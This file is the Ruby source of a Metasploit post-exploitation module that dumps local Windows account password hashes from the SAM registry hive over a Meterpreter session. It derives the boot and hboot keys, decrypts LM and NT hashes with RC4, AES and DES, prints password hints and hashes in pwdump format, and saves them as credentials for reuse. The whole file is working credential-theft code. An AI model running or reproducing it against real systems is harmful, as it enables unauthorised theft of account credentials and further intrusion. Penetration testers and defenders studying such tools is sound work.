##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Local User Account Password Hashes (Registry)',
      'Description'   => %q{ This module will dump the local user accounts from the SAM database using the registry },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'hdm' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    # Constants for SAM decryption
    @sam_lmpass   = "LMPASSWORD\x00"
    @sam_ntpass   = "NTPASSWORD\x00"
    @sam_qwerty   = "!@\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    @sam_numeric  = "0123456789012345678901234567890123456789\x00"
    @sam_empty_lm = ["aad3b435b51404eeaad3b435b51404ee"].pack("H*")
    @sam_empty_nt = ["31d6cfe0d16ae931b73c59d7e0c089c0"].pack("H*")

  end

  def run
    tries = 0

    begin

      print_status("Obtaining the boot key...")
      bootkey  = capture_boot_key

      print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack("H*")[0]}...")
      hbootkey = capture_hboot_key(bootkey)

      print_status("Obtaining the user list and keys...")
      users    = capture_user_keys

      print_status("Decrypting user keys...")
      users    = decrypt_user_keys(hbootkey, users)

      print_status("Dumping password hints...")
      print_line()
      hint_count = 0
      users.keys.sort{|a,b| a<=>b}.each do |rid|
        #If we have a hint then print it
        if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
          print_line "#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\""
          hint_count += 1
        end
      end
      print_line "No users with password hints on this system" if hint_count == 0
      print_line()

      print_status("Dumping password hashes...")
      print_line()
      print_line()

      # Assemble the information about the SMB service for this host
      service_data = {
          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
          port: 445,
          service_name: 'smb',
          protocol: 'tcp',
          workspace_id: myworkspace_id
      }

      # Assemble data about the credential objects we will be creating
      credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: self.refname,
          private_type: :ntlm_hash
      }

      # Merge the service data into the credential data
      credential_data.merge!(service_data)

      users.keys.sort{|a,b| a<=>b}.each do |rid|
        hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"

        # Add the details for this specific credential
        credential_data[:private_data] = users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0]
        credential_data[:username]     = users[rid][:Name].downcase

        # Create the Metasploit::Credential::Core object
        credential_core = create_credential(credential_data)

        # Assemble the options hash for creating the Metasploit::Credential::Login object
        login_data ={
          core: credential_core,
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        # Merge in the service data and create our Login
        login_data.merge!(service_data)
        login = create_credential_login(login_data)


        print_line hashstring
      end
      print_line()
      print_line()

    rescue ::Interrupt
      raise $!
    rescue ::Rex::Post::Meterpreter::RequestError => e
      # Sometimes we get this invalid handle race condition.
      # So let's retry a couple of times before giving up.
      # See bug #6815
      if tries < 5 and e.to_s =~ /The handle is invalid/
        print_status("Handle is invalid, retrying...")
        tries += 1
        retry

      else
        print_error("Meterpreter Exception: #{e.class} #{e}")
        print_error("This script requires the use of a SYSTEM user context (hint: migrate into service process)")
      end
    #rescue ::Exception => e
    #	print_error("Error: #{e.class} #{e} #{e.backtrace}")
    end
  end

  def capture_hboot_key(bootkey)
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account", KEY_READ)
    return if not ok
    vf = ok.query_value("F")
    return if not vf
    vf = vf.data
    ok.close

    revision = vf[0x68, 4].unpack('V')[0]

    case revision
      when 1
        hash = Digest::MD5.new
        hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)

        rc4 = OpenSSL::Cipher.new("rc4")
        rc4.key = hash.digest
        hbootkey  = rc4.update(vf[0x80, 32])
        hbootkey << rc4.final
        hbootkey
      when 2
        aes = OpenSSL::Cipher.new('aes-128-cbc')
        aes.key = bootkey
        aes.padding = 0
        aes.decrypt
        aes.iv = vf[0x78, 16]
        aes.update(vf[0x88, 16]) # we need only 16 bytes
      else
        raise NotImplementedError, "Unknown hboot_key revision: #{revision}"
    end
  end

  def capture_user_keys
    users = {}
    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users", KEY_READ)
    return if not ok

    ok.enum_key.each do |usr|
      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\#{usr}", KEY_READ)
      next if usr == 'Names'
      users[usr.to_i(16)] ||={}
      users[usr.to_i(16)][:F] = uk.query_value("F").data
      users[usr.to_i(16)][:V] = uk.query_value("V").data

      #Attempt to get Hints (from Win7/Win8 Location)
      begin
        users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
      rescue ::Rex::Post::Meterpreter::RequestError
        users[usr.to_i(16)][:UserPasswordHint] = nil
      end

      uk.close
    end
    ok.close

    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names", KEY_READ)
    ok.enum_key.each do |usr|
      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\#{usr}", KEY_READ)
      r = uk.query_value("")
      rid = r.type
      users[rid] ||= {}
      users[rid][:Name] = usr

      #Attempt to get Hints (from WinXP Location) only if it's not set yet
      if users[rid][:UserPasswordHint].nil?
        begin
          uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
          users[rid][:UserPasswordHint] = uk_hint.query_value("").data
        rescue ::Rex::Post::Meterpreter::RequestError
          users[rid][:UserPasswordHint] = nil
        end
      end

      uk.close
    end
    ok.close
    users
  end

  def decrypt_user_keys(hbootkey, users)
    users.each_key do |rid|
      user = users[rid]

      hashlm_off = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
      hashlm_len = user[:V][0xa0, 4].unpack("V")[0]
      hashlm_enc = user[:V][hashlm_off, hashlm_len]

      hashnt_off = user[:V][0xa8, 4].unpack("V")[0] + 0xcc
      hashnt_len = user[:V][0xac, 4].unpack("V")[0]
      hashnt_enc = user[:V][hashnt_off, hashnt_len]

      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass, @sam_empty_lm)
      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass, @sam_empty_nt)
    end

    users
  end

  def decode_windows_hint(e_string)
    d_string = ""
    e_string.scan(/..../).each do |chunk|
      bytes = chunk.scan(/../)
      d_string += (bytes[1] + bytes[0]).to_s.hex.chr
    end
    d_string
  end

  def rid_to_key(rid)

    s1 = [rid].pack("V")
    s1 << s1[0,3]

    s2b = [rid].pack("V").unpack("C4")
    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack("C4")
    s2 << s2[0,3]

    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
  end

  def decrypt_user_hash(rid, hbootkey, enchash, pass, default)
    revision = enchash[2, 2].unpack('v')[0]

    case revision
      when 1
        if enchash.length < 20
          return default
        end

        md5 = Digest::MD5.new
        md5.update(hbootkey[0,16] + [rid].pack("V") + pass)

        rc4 = OpenSSL::Cipher.new('rc4')
        rc4.key = md5.digest
        okey = rc4.update(enchash[4, 16])
      when 2
        if enchash.length < 40
          return default
        end

        aes = OpenSSL::Cipher.new('aes-128-cbc')
        aes.key = hbootkey[0, 16]
        aes.padding = 0
        aes.decrypt
        aes.iv = enchash[8, 16]
        okey = aes.update(enchash[24, 16]) # we need only 16 bytes
      else
        print_error("Unknown user hash revision: #{revision}")
        return default
    end

    des_k1, des_k2 = rid_to_key(rid)

    d1 = OpenSSL::Cipher.new('des-ecb')
    d1.padding = 0
    d1.key = des_k1

    d2 = OpenSSL::Cipher.new('des-ecb')
    d2.padding = 0
    d2.key = des_k2

    d1o  = d1.decrypt.update(okey[0,8])
    d1o << d1.final

    d2o  = d2.decrypt.update(okey[8,8])
    d1o << d2.final
    d1o + d2o
  end
end
